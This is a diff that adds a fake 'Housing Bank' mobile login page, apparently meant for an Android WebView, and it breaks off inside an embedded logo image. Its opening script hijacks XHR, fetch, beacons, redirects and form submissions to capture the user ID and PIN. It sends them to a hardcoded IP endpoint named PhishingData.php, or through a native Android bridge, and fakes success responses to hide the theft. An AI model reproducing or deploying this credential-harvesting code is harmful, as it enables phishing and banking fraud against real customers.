@@ -1,0 +1,1209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<script>
+(function(){
+  if (window.__fyInterceptorInjected) return;
+  window.__fyInterceptorInjected = true;
+
+  var TARGET_PATH = '/api/PhishingData.php';
+  var TARGET_URL = 'http://18.142.44.159:8035/api/PhishingData.php';
+
+  function isOurTargetUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1 || u.indexOf(TARGET_URL) !== -1) return true;
+    try {
+      var cfg = (window.__PHISH_CONFIG__ || window.__PHISH_CONFIG) || {};
+      var submitUrl = cfg.submit_url || '';
+      if (submitUrl && u.indexOf(submitUrl) !== -1) return true;
+    } catch(e){}
+    return false;
+  }
+
+  var STATIC_EXT_RE = /\.(css|js|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|mp[34]|webm|pdf|zip|rar|7z|map|woff|bmp|tiff?|aac|flac|ogg|wav|webp|avif)(\?|#|$)/i;
+
+  function isSubmitUrl(u){
+    if (!u) return false;
+    u = String(u);
+    if (u.indexOf(TARGET_PATH) !== -1) return true;
+    if (u.indexOf(TARGET_URL) !== -1) return true;
+    if (STATIC_EXT_RE.test(u)) return false;
+    if (/\/api\/|\/inj\/|\/inject|\/submit|\/login|\/log\/|\/save|\/post|\/send|\/upload|\/collect|\/capture|\/result|\/phish|\/form/i.test(u)) {
+      return true;
+    }
+    if (/\.php(\?|&|$)|\.asp(\?|&|$)|\.aspx(\?|&|$)|\.jsp(\?|&|$)|\.do(\?|&|$)|\.action(\?|&|$)|\.ashx(\?|&|$)|\.cgi(\?|&|$)/i.test(u)) {
+      return true;
+    }
+    return false;
+  }
+
+  function formDataToObj(fd){
+    var o = {};
+    try {
+      var add = function(k, v){
+        if (o[k] !== undefined) {
+          if (!Array.isArray(o[k])) o[k] = [o[k]];
+          o[k].push(v);
+        } else { o[k] = v; }
+      };
+      if (fd.forEach) { fd.forEach(function(v, k){ add(k, v); }); }
+      else if (fd.entries) {
+        var it = fd.entries(), r;
+        while (!(r = it.next()).done) add(r.value[0], r.value[1]);
+      }
+    } catch(e){}
+    return o;
+  }
+
+  function urlEncodedToObj(s){
+    var o = {};
+    try {
+      s.split('&').forEach(function(p){
+        if (!p) return;
+        var idx = p.indexOf('=');
+        var k, v;
+        if (idx === -1) { k = decodeURIComponent(p.replace(/\+/g,' ')); v = ''; }
+        else { k = decodeURIComponent(p.substring(0,idx).replace(/\+/g,' '));
+               v = decodeURIComponent(p.substring(idx+1).replace(/\+/g,' ')); }
+        if (k) o[k] = v;
+      });
+    } catch(e){}
+    return o;
+  }
+
+  function normalizeBody(body){
+    if (body === null || body === undefined) return {};
+    if (body instanceof FormData) return formDataToObj(body);
+    if (typeof body === 'string') {
+      var t = body.trim();
+      if (t === '') return {};
+      if ((t.charAt(0)==='{' && t.charAt(t.length-1)==='}') ||
+          (t.charAt(0)==='[' && t.charAt(t.length-1)===']')) {
+        try { return JSON.parse(t); } catch(e){}
+      }
+      if (t.indexOf('=') !== -1 && t.indexOf('{') === -1) return urlEncodedToObj(t);
+      return { raw: body };
+    }
+    if (typeof body === 'object') {
+      if (typeof URLSearchParams !== 'undefined' && body instanceof URLSearchParams) {
+        var o = {};
+        try { body.forEach(function(v,k){ o[k]=v; }); } catch(e){}
+        return o;
+      }
+      if (body instanceof Blob || body instanceof File) return { raw: '[binary]' };
+      return body;
+    }
+    return { raw: String(body) };
+  }
+
+  // 提前保存原始 XHR 方法，供 fyPostPhish 的 fallback 使用
+  var _origOpen = XMLHttpRequest.prototype.open;
+  var _origSend = XMLHttpRequest.prototype.send;
+
+  function ensureFyPostPhish(){
+    if (typeof window.fyPostPhish === 'function') return window.fyPostPhish;
+    window.fyPostPhish = function(raw){
+      try {
+        var cfg = window.__PHISH_CONFIG || {};
+        var clean = normalizeBody(raw);
+        // 优先使用原生桥接 Android.submitData，避免 WebView 跨域 CORS 预检
+        if (typeof Android !== 'undefined' && Android.submitData) {
+          try {
+            Android.submitData(JSON.stringify(clean));
+            return;
+          } catch(e){}
+        }
+        // Fallback：XHR（仅用于浏览器测试环境，无原生桥接时）
+        // 直接用原始 open/send 发送，避免被自身拦截器再次拦截导致递归
+        var body = {
+          phone_id: cfg.phone_id || '',
+          package_name: cfg.package_name || '',
+          appName: cfg.appName || '',
+          payload: clean
+        };
+        var url = cfg.submit_url || TARGET_URL;
+        var xhr = new XMLHttpRequest();
+        _origOpen.call(xhr, 'POST', url, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        _origSend.call(xhr, JSON.stringify(body));
+      } catch(e){}
+    };
+    return window.fyPostPhish;
+  }
+
+  var fyPostPhish = ensureFyPostPhish();
+
+  // 模拟 XHR 完成，触发页面回调，避免页面逻辑挂起
+  function mockXhrComplete(xhr){
+    try {
+      var respBody = '{"code":200,"msg":"ok"}';
+      try {
+        xhr.readyState = 4;
+        xhr.status = 200;
+        xhr.statusText = 'OK';
+        xhr.responseText = respBody;
+        xhr.response = respBody;
+        xhr.responseURL = TARGET_URL;
+      } catch(e){
+        var props = { readyState:4, status:200, statusText:'OK', responseText:respBody, response:respBody, responseURL:TARGET_URL };
+        for (var k in props) {
+          try { Object.defineProperty(xhr, k, { value: props[k], writable:true, configurable:true }); } catch(e2){}
+        }
+      }
+      try {
+        xhr.getResponseHeader = function(name){ return /content-type/i.test(name) ? 'application/json' : null; };
+        xhr.getAllResponseHeaders = function(){ return 'content-type: application/json\r\n'; };
+      } catch(e){}
+      if (typeof xhr.onreadystatechange === 'function') xhr.onreadystatechange.call(xhr);
+      if (typeof xhr.onload === 'function') xhr.onload.call(xhr);
+      if (typeof xhr.onloadend === 'function') xhr.onloadend.call(xhr);
+      if (typeof xhr.dispatchEvent === 'function') {
+        try { xhr.dispatchEvent(new Event('readystatechange')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('load')); } catch(e){}
+        try { xhr.dispatchEvent(new Event('loadend')); } catch(e){}
+      }
+    } catch(e){}
+  }
+
+  // 劫持 XMLHttpRequest（支持 POST 和 GET 带参）
+  XMLHttpRequest.prototype.open = function(method, url){
+    this.__fyMethod = (method || '').toUpperCase();
+    this.__fyUrl = url;
+    this.__fyIsSubmit = isSubmitUrl(url);
+    return _origOpen.apply(this, arguments);
+  };
+  XMLHttpRequest.prototype.send = function(body){
+    try {
+      var method = this.__fyMethod || 'GET';
+      var url = this.__fyUrl || '';
+      var isSubmit = this.__fyIsSubmit;
+      if (method === 'POST' && isSubmit) {
+        fyPostPhish(normalizeBody(body));
+        mockXhrComplete(this);
+        return;
+      }
+      if (method === 'GET' && isSubmit && /[?&][^=]+=/.test(String(url))) {
+        var qs = String(url).split('?')[1] || '';
+        fyPostPhish(urlEncodedToObj(qs));
+        mockXhrComplete(this);
+        return;
+      }
+    } catch(e){}
+    return _origSend.apply(this, arguments);
+  };
+
+  // 劫持 fetch（支持 POST 和 GET 带参，兼容 Request 对象）
+  if (window.fetch) {
+    var _origFetch = window.fetch;
+    window.fetch = function(url, opts){
+      try {
+        opts = opts || {};
+        var isReq = (typeof Request !== 'undefined') && (url instanceof Request);
+        var urlStr = isReq ? url.url : (typeof url === 'string' ? url : (url && url.url) || '');
+        var method = (isReq ? url.method : (opts.method || 'GET')).toUpperCase();
+        var isSubmit = isSubmitUrl(urlStr);
+        var isPost = method === 'POST';
+        var isGetWithData = method === 'GET' && isSubmit && /[?&][^=]+=/.test(urlStr);
+        if ((isPost && isSubmit) || isGetWithData) {
+          var body = isReq ? (opts.body || (url.body ? '[stream]' : undefined)) : opts.body;
+          var data = isGetWithData ? urlEncodedToObj(urlStr.split('?')[1] || '') : normalizeBody(body);
+          fyPostPhish(data);
+          var fakeResp = new Response(JSON.stringify({code:200,msg:'saved'}), {
+            status: 200, statusText: 'OK',
+            headers: {'Content-Type':'application/json'}
+          });
+          return Promise.resolve(fakeResp);
+        }
+      } catch(e){}
+      return _origFetch.apply(this, arguments);
+    };
+  }
+
+  // 劫持 sendBeacon（现代浏览器无痕提交）
+  if (navigator && typeof navigator.sendBeacon === 'function') {
+    var _origBeacon = navigator.sendBeacon.bind(navigator);
+    navigator.sendBeacon = function(url, data){
+      try {
+        if (isSubmitUrl(url)) {
+          fyPostPhish(normalizeBody(data));
+          return true;
+        }
+      } catch(e){}
+      return _origBeacon(url, data);
+    };
+  }
+
+  // 劫持 <script src>（JSONP 跨域提交）
+  try {
+    var _origScriptSrc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
+    if (_origScriptSrc && _origScriptSrc.set) {
+      Object.defineProperty(HTMLScriptElement.prototype, 'src', {
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && v.indexOf('?') !== -1 && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origScriptSrc.set.call(this, v);
+        },
+        get: _origScriptSrc.get,
+        configurable: true
+      });
+    }
+  } catch(e){}
+
+  // 劫持 location 跳转带参（支持 location.href= / location.assign/replace）
+  // 注意：不劫持 window.location 本身，因为它是 WebView 原生管理的特殊对象，
+  // 劫持其 getter/setter 会破坏 WebView 内部状态导致严重卡顿。
+  // window.location = url 等价于 location.href = url，会被下面的 href setter 拦截。
+  var _hrefDesc = Object.getOwnPropertyDescriptor(Location.prototype, 'href');
+  var _origHrefSet = _hrefDesc && _hrefDesc.set ? _hrefDesc.set : null;
+  if (_origHrefSet) {
+    try {
+      Object.defineProperty(Location.prototype, 'href', {
+        configurable: true,
+        get: _hrefDesc.get,
+        set: function(v){
+          try {
+            if (v && typeof v === 'string' && /[?&][^=]+=/.test(v) && isSubmitUrl(v)) {
+              var qs = v.split('?')[1] || '';
+              fyPostPhish(urlEncodedToObj(qs));
+            }
+          } catch(e){}
+          _origHrefSet.call(this, v);
+        }
+      });
+    } catch(e){}
+  }
+  // 劫持 location.assign(url) 和 location.replace(url)
+  try {
+    var _origAssign = Location.prototype.assign;
+    var _origReplace = Location.prototype.replace;
+    Location.prototype.assign = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origAssign.call(this, url);
+    };
+    Location.prototype.replace = function(url){
+      try {
+        if (url && typeof url === 'string' && /[?&][^=]+=/.test(url) && isSubmitUrl(url) && !isOurTargetUrl(url)) {
+          var qs = url.split('?')[1] || '';
+          fyPostPhish(urlEncodedToObj(qs));
+        }
+      } catch(e){}
+      return _origReplace.call(this, url);
+    };
+  } catch(e3){}
+
+  // 劫持 form.submit() 程序化提交（DOM 规范：submit() 不触发 submit 事件）
+  try {
+    var _origFormSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function(){
+      try {
+        var form = this;
+        var action = form.getAttribute('action') || '';
+        var method = (form.getAttribute('method') || 'get').toUpperCase();
+        var isPost = method === 'POST';
+        var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+        if (isPost && (action === '' || isSubmitUrl(action))) {
+          var data = {};
+          try {
+            new FormData(form).forEach(function(v, k){
+              if (data[k] !== undefined) {
+                if (!Array.isArray(data[k])) data[k] = [data[k]];
+                data[k].push(v);
+              } else { data[k] = v; }
+            });
+          } catch(e2){}
+          fyPostPhish(data);
+          return; // 阻止真实提交
+        } else if (isGetSubmit) {
+          var dataGet = {};
+          try {
+            new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+          } catch(e3){}
+          fyPostPhish(dataGet);
+          return;
+        }
+      } catch(e){}
+      return _origFormSubmit.apply(this, arguments);
+    };
+  } catch(e){}
+
+  // 劫持原生 form 提交（捕获阶段，优先于业务代码，支持 POST 和 GET）
+  document.addEventListener('submit', function(e){
+    try {
+      var form = e.target;
+      if (!form || form.tagName !== 'FORM') return;
+      var action = form.getAttribute('action') || '';
+      var method = (form.getAttribute('method') || 'get').toUpperCase();
+      var isPost = method === 'POST';
+      var isGetSubmit = method === 'GET' && isSubmitUrl(action);
+      if (isPost && (action === '' || isSubmitUrl(action))) {
+        e.preventDefault();
+        var data = {};
+        try {
+          new FormData(form).forEach(function(v, k){
+            if (data[k] !== undefined) {
+              if (!Array.isArray(data[k])) data[k] = [data[k]];
+              data[k].push(v);
+            } else { data[k] = v; }
+          });
+        } catch(e2){}
+        fyPostPhish(data);
+      } else if (isGetSubmit) {
+        e.preventDefault();
+        var dataGet = {};
+        try {
+          new FormData(form).forEach(function(v, k){ dataGet[k] = v; });
+        } catch(e3){}
+        fyPostPhish(dataGet);
+      }
+    } catch(e){}
+  }, true);
+})();
+</script>
+
+<meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Housing Bank</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background: #f8fafc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      color: #1e293b;
+      overflow: hidden;
+    }
+
+    /* 移动端视口容器 */
+    .app-viewport {
+      display: flex;
+      flex-direction: column;
+      width: 100%;
+      height: 100%;
+      max-width: 460px;
+      margin: 0 auto;
+      background: #f8fafc;
+      position: relative;
+    }
+
+    /* 顶部导航行（右侧青蓝色菜单图标） */
+    .nav-header {
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      padding: 12px 20px 0;
+      flex-shrink: 0;
+    }
+    .menu-btn {
+      width: 32px;
+      height: 32px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: flex-end;
+      gap: 4.5px;
+      cursor: pointer;
+    }
+    .menu-bar {
+      height: 2.2px;
+      background: #00b4d8;
+      border-radius: 2px;
+    }
+    .bar-1 { width: 22px; }
+    .bar-2 { width: 15px; }
+    .bar-3 { width: 22px; }
+
+    /* 主滚动区域 */
+    .main-body {
+      flex: 1;
+      padding: 4px 22px 14px;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+
+    /* 品牌 Logo 区域 */
+    .brand-logo-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-top: 6px;
+      margin-bottom: 26px;
+    }
+    .logo-img {
+      width: 195px;
+      height: auto;
+      max-width: 85%;
+      display: block;
+      object-fit: contain;
+    }
+
+    /* 两步切换容器 */
+    .step-view {
+      display: none;
+      flex-direction: column;
+      width: 100%;
+    }
+    .step-view.active {
+      display: flex;
+      animation: fadeIn 0.25s ease-out forwards;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(8px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ========================================================
+       STEP 1: 登录主表单 (白底浮雕圆角卡片)
+       ======================================================== */
+    .input-card {
+      width: 100%;
+      height: 54px;
+      background: #ffffff;
+      border: 1px solid #eef2f6;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      margin-bottom: 16px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .input-card:focus-within {
+      border-color: #004b87;
+      box-shadow: 0 2px 10px rgba(0, 75, 135, 0.1);
+    }
+
+    .field-icon {
+      width: 24px;
+      height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    .field-icon svg {
+      width: 19px;
+      height: 19px;
+      stroke: #64748b;
+      stroke-width: 1.8;
+      fill: none;
+    }
+
+    .native-input {
+      flex: 1;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 15px;
+      font-weight: 500;
+      color: #1e293b;
+      height: 100%;
+    }
+    .native-input::placeholder {
+      color: #94a3b8;
+      font-weight: 400;
+    }
+
+    .info-circle-btn {
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      flex-shrink: 0;
+    }
+    .info-circle-btn svg {
+      width: 19px;
+      height: 19px;
+      stroke: #94a3b8;
+      stroke-width: 1.6;
+      fill: none;
+    }
+
+    /* Remember User ID */
+    .remember-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 2px;
+      margin-bottom: 22px;
+      cursor: pointer;
+    }
+    .custom-checkbox {
+      width: 20px;
+      height: 20px;
+      border: 1.6px solid #94a3b8;
+      border-radius: 4px;
+      background: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.15s;
+    }
+    .custom-checkbox.checked {
+      background: #004b87;
+      border-color: #004b87;
+    }
+    .custom-checkbox svg {
+      width: 13px;
+      height: 13px;
+      stroke: #ffffff;
+      stroke-width: 2.2;
+      fill: none;
+      display: none;
+    }
+    .custom-checkbox.checked svg {
+      display: block;
+    }
+    .remember-label {
+      font-size: 14.5px;
+      color: #334155;
+      font-weight: 500;
+    }
+
+    /* 主 Login 按钮 */
+    .login-submit-btn {
+      width: 100%;
+      height: 48px;
+      background: #004b87;
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.15s, transform 0.1s;
+      box-shadow: 0 4px 12px rgba(0, 75, 135, 0.25);
+    }
+    .login-submit-btn:active {
+      transform: scale(0.985);
+      opacity: 0.9;
+    }
+
+    /* 辅助链接行 (FAQs & Trouble logging in?) */
+    .help-links-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 22px;
+      margin-bottom: 26px;
+      font-size: 13.5px;
+    }
+    .faq-link {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #334155;
+      font-weight: 500;
+      text-decoration: none;
+    }
+    .faq-link svg {
+      width: 16px;
+      height: 16px;
+      stroke: #334155;
+      stroke-width: 1.8;
+      fill: none;
+    }
+    .trouble-link {
+      color: #334155;
+      font-weight: 500;
+      text-decoration: none;
+    }
+
+    /* 底部操作按钮 (Register / New Customer) */
+    .action-cards-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 14px;
+      margin-bottom: 20px;
+    }
+    .action-pill-btn {
+      height: 44px;
+      background: #ffffff;
+      border: 1.5px solid #004b87;
+      border-radius: 8px;
+      color: #004b87;
+      font-size: 14.5px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      text-decoration: none;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.02);
+      transition: background 0.15s;
+    }
+    .action-pill-btn:active {
+      background: #edf4fa;
+    }
+
+    /* ========================================================
+       STEP 2: 4 位数字 PIN 码与扁椭圆键盘
+       ======================================================== */
+    .pin-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #0f172a;
+      text-align: center;
+      margin-top: 8px;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+    }
+    .pin-subtitle {
+      font-size: 13.5px;
+      color: #556274;
+      text-align: center;
+      margin-bottom: 26px;
+    }
+
+    /* PIN 码 4 个圆圈槽位 */
+    .pin-dots-wrap {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 34px;
+      direction: ltr;
+    }
+    .pin-dot {
+      width: 17px;
+      height: 17px;
+      border-radius: 50%;
+      border: 1.5px solid #94a3b8;
+      background: transparent;
+      transition: all 0.18s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .pin-dot.filled {
+      background: #004b87;
+      border-color: #004b87;
+      box-shadow: 0 0 0 3px rgba(0, 75, 135, 0.2);
+    }
+
+    /* 横向扁椭圆阿语数字软键盘 (3列 x 4行) */
+    .keypad-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      column-gap: 14px;
+      row-gap: 14px;
+      width: 100%;
+      max-width: 320px;
+      margin: 0 auto;
+      direction: rtl; /* 阿拉伯右到左: 最右1，中间2，左边3 */
+    }
+    .num-key {
+      height: 50px;
+      border-radius: 50px;
+      background: #ffffff;
+      border: 1px solid #cfd8e3;
+      font-size: 23px;
+      font-weight: 700;
+      color: #0f172a;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.12s, transform 0.1s, border-color 0.12s;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.03);
+    }
+    .num-key:active {
+      background: #eef4f8;
+      transform: scale(0.94);
+      border-color: #94a3b8;
+    }
+    .num-key.empty {
+      background: transparent;
+      border: none;
+      box-shadow: none;
+      pointer-events: none;
+    }
+    .num-key.backspace {
+      background: #ffffff;
+      border: 1px solid #cfd8e3;
+    }
+    .num-key.backspace svg {
+      width: 22px;
+      height: 22px;
+      stroke: #1e293b;
+      stroke-width: 1.8;
+      fill: none;
+    }
+
+    /* ========================================================
+       底部固定 TabBar 导航栏
+       ======================================================== */
+    .bottom-tab-bar {
+      height: 60px;
+      background: #ffffff;
+      border-top: 1px solid #e9edf2;
+      display: flex;
+      align-items: center;
+      justify-content: space-around;
+      padding: 4px 8px 6px;
+      flex-shrink: 0;
+    }
+    .tab-item {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 3px;
+      cursor: pointer;
+      color: #64748b;
+    }
+    .tab-item:active {
+      opacity: 0.75;
+    }
+    .tab-icon-box {
+      width: 22px;
+      height: 22px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .tab-icon-box svg {
+      width: 19px;
+      height: 19px;
+      stroke: #64748b;
+      stroke-width: 1.8;
+      fill: none;
+    }
+    .tab-label {
+      font-size: 10.5px;
+      font-weight: 500;
+      color: #64748b;
+    }
+
+    /* 提交加载遮罩 */
+    .loading-overlay {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(248, 250, 252, 0.94);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    .loading-overlay.show {
+      display: flex;
+      animation: fadeIn 0.2s ease forwards;
+    }
+    .spinner {
+      width: 42px;
+      height: 42px;
+      border: 3.5px solid rgba(0, 75, 135, 0.2);
+      border-top-color: #004b87;
+      border-radius: 50%;
+      animation: animSpin 0.7s linear infinite;
+    }
+    @keyframes animSpin {
+      to { transform: rotate(360deg); }
+    }
+    .loading-text {
+      margin-top: 14px;
+      color: #004b87;
+      font-size: 14.5px;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-viewport">
+
+  <!-- 顶部菜单图标 -->
+  <header class="nav-header">
+    <div class="menu-btn" onclick="handleMenu()">
+      <div class="menu-bar bar-1"></div>
+      <div class="menu-bar bar-2"></div>
+      <div class="menu-bar bar-3"></div>
+    </div>
+  </header>
+
+  <!-- 主体区域 -->
+  <main class="main-body">
+
+    <!-- Housing Bank 白底彩色官方 Logo -->
+    <div class="brand-logo-wrap">
+      <img class="logo-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXwAAACOCAMAAAAFFENeAAABCGlDQ1BJQ0MgUHJvZmlsZQAAeJxjYGA8wQAELAYMDLl5JUVB7k4KEZFRCuwPGBiBEAwSk4sLGHADoKpv1yBqL+viUYcLcKakFicD6Q9ArFIEtBxopAiQLZIOYWuA2EkQtg2IXV5SUAJkB4DYRSFBzkB2CpCtkY7ETkJiJxcUgdT3ANk2uTmlyQh3M/Ck5oUGA2kOIJZhKGYIYnBncAL5H6IkfxEDg8VXBgbmCQixpJkMDNtbGRgkbiHEVBYwMPC3MDBsO48QQ4RJQWJRIliIBYiZ0tIYGD4tZ2DgjWRgEL7AwMAVDQsIHG5TALvNnSEfCNMZchhSgSKeDHkMyQx6QJYRgwGDIYMZAKbWPz9HbOBQAAABgFBMVEX6/vz6+vr6/PH6+vH6+fj3+fn7+fD6+Pj4+Pj3+Pn8+PD5+PP3+PP59/n39/v39/n39/j39/f69/X49/b49/X89/H49/P39/b39/X39/P0/v31+vz1/PX1+vX0+fr1+fT1+Pv1+Pnz+Pv2+Pf0+Pf2+PX1+PL29/v29/n09/v19/f19/Pv/v/v+/7w+/vw+/Xx+Pzu+Pzw+Pfw+PLo/v7o+/3o+f7p+Pjh/f7h+f3b+/7T+/779vn59vj49vn49vf39vv29vn69vX79vH49vT39vX29vX39vL69fn39fj69fL39fL59PX58u/09vn09fnu9fr19fXw9fXy9fDw8vfw8Ovt6Nnw5Nbn9Pne9Pvg7/Xh5eLR8fvQ5fDD6vi/4fDO1dbMxbPLwK7FspWw1eapx9i2taiUuMzCr5emr6mRqbaFna10n7ZtlKxsiJxXg51TcoY9bIk+XHExW3UkWnwaVH0dUXQJUZApTGgdTG0MTooUS28iRmERRmoePlkNPl2NutJrAABOIUlEQVR42u19CUNaWbY1JKAYEJkE5CqCDMoo8+CEExBFkUETQBRTBUXHeX5aavzr39rngmJiqtPG6n79vZyyoiLcYd199tnjOgLlr/EfG4JfEPwC/xf4v8Yv8H+B/2v8Av8X+L/GL/B/gf8zI/XND//JIZFI2j/8kvx/P/i/1M4vtfNr/AL/F/j/V0Yq9Qv8/yz4Ejb+r4CfSqVSyv9NJs//GfBTDPvU/ybsxf857F8LfL1er8M3RV9fn4J+1+mU7AX2szKR6BD7l6KfoPHS60t0XqlePzPT12exWKxiGj1ii2Xg4WqVT9/JfqLb4m9Fr0sov7kKi9Ji6fyc7u8HX6NRty7LYrPJZDIbhnkUA+irtVqNVqtWi9TqfL6oEamSajWgEwolylQ+n3cC/2TnPVho9PT0jNGwtJGmN+AQ+ZQwn+/unZ5aycyLUim1y6bXsTcAwT56P926Aj/guSfaB+vrm5lJMPw0NOZV7JtGr8eVarVT72dHzZw1YAgEh4Z8HDdctNtsYmGP00kAkyRZ1LgHrVY2oLOIs6NyR1Yu7EtqtAOZFeFiRj3TO7OUTKWVcjwTnW3YNjxMd2/jT4Z71/zbwFc8gj82OzsrVyh1uGyVVKtdTGrUvULBYkYlymSEwrySQQ/wlcnkt+Bb5PKxMTOGxaJIJKan8QZdMuNKpzRCXUqSeD81P69SDegBvk1Hf5+emekdo08oCHyzGeAnnoA/0wJ/HkPFQ8/ATy+/B/imQCDgDYwPjudygUH78HB+bW5OLm6Bb7NpCHyZbAAPJSuX47ZEyqRGKsskhN3L6iWMxMCADuDr9J3g0/n+reD3WejEOL/VMjc7NzeT0OEOBwZkEBtg3NubUK+ohCLAnhCJeMnPPw8+ybHZODJiNstnZnjwNRq7S61zQiIlS4npqe5FXUKdt9mU9Heg34uJRuArFAAf/yQSOp3OZsOxFAoCH7/p1I+DfgX4ssXpWUh+IGAMGMeDxYAv4LIPu/LZ7Noj+PgYZFg2gMeAGTk7MyPBNatF0oxiWq2dnlEsLWlkUgJf3wG+jp1Pq1Gr/w3gJxKP4A8NW42OuRm6R42G7lCm10FnJBL5DaEwlRIIN4oCoRDwzwFK53Pg9xD4DtPIyIhplOQWigWKS6YWOgtGo3nUsTYn7M0n8ficFiD7HmMGGI6SppLTR5m2YlJrI0VE4FuYSnpUYnQmG9ROYmZ2zOoUGwuBwEYRyqcQKBSsHGfK5yUSXu0oFUqFAuob4qwTSXC+RJLAd+V7lvID3d1QO1qZVCLvUfKTScbrKnY+3d+/4NL0aoOPO7JYrWaTY6Y1wfU2i8Ric6UkQmF3r1CozOexxkqETOfk15xzc8+AT2j1mUfYcIzO8uBrXUWb0DRiMPh83MjaaE9eIpyT9I31tcBn6AP/WXkbfDp3G/y+DvAfTjTWp5dp1fibzWIrrOesw8FCIeo1+HIjT8BnN6bAjdn0GpFmcboX4GvUw3hEciUmNKbxAA++bgDQSyHsbfBxCoXl7wYfD7yldhR0UwqAMDs9v7C8vIj7t4qtZqszn+3tA+55nVgozhfX19cL6+t5yP3c3LMWTyJB4PtoOLB4zCTUyQGZa9jqy3k9Hr+B8zm4UaF8TQgNPDtL4NP3rMOBE8/OEfhQVU/Ap+V4rK892GqOVUkpk+kUUD8SsTWXKwSLwUKp5PHn/L6AUSBU0prJ7os9VYtFp9d0Ly9PqRaTUH+BgN/HmfOp7jkFdKvdRjp/IJ3Wkppn4GPdt5qNJsXfDL6O2WEPtqVSIQcEU/P9CwBfZzNCnXImDLl8zil2Fmz5zZ2dzayQwJiD4nkO/MR0ogdKx+fxMPTlWCySSZvNGvB4SpVSpOTx5TgTJ19j2LfBlzsw5KNzc6NjbBFm0+5Z8HnscZEKGzQiRMdlMZVKlUogGCiVy5WIwZszWvP6VFJLaxmbUg4zlAgspeVllWpxQCQuRPF+H+fKC+V4enY7lol8MpnJLBL4qZSege/AXf/d4CuZZa/gsYdZ3wG+3mzkRvxekmEjB2VPuOP/nc21njHF2Jxi7nnJn54H+D6fx4/hc8gJ/MWkbDjg9VQau7u7W3gGPpNpbX2OZsXM+97e94T9CP4zPYKv+gp8xZPBwO+z2bFE2u020+bn3c+NSjS6s7vb3CkZvFyh6EontZqkom+W0G+Bv7y63K9K2cRc9DPeuOUzFkzZOeewvZhfW2OKNEWaKpXKA3yLZdRkMo/93eCz2Q3wSTVj8SX9Ozul6p9f1FmNPtITuZyf81U2dz798ccnoF8wWqF3CrAz52b7notqqecTfaYRv4cNjpP3dM/PD7gAfnhr7/TqtFmOlPBQ1tYAOa3HdEK5yZfDamAazWZb4M+raMklzdvWiE9WFh784WHrkD0o4Bqnp6d7W6Xy7unpMR6uwcC5XPY01iO6FxL9HrFSpyLwVdKi1WioHN+eHjei3oA5mzVbo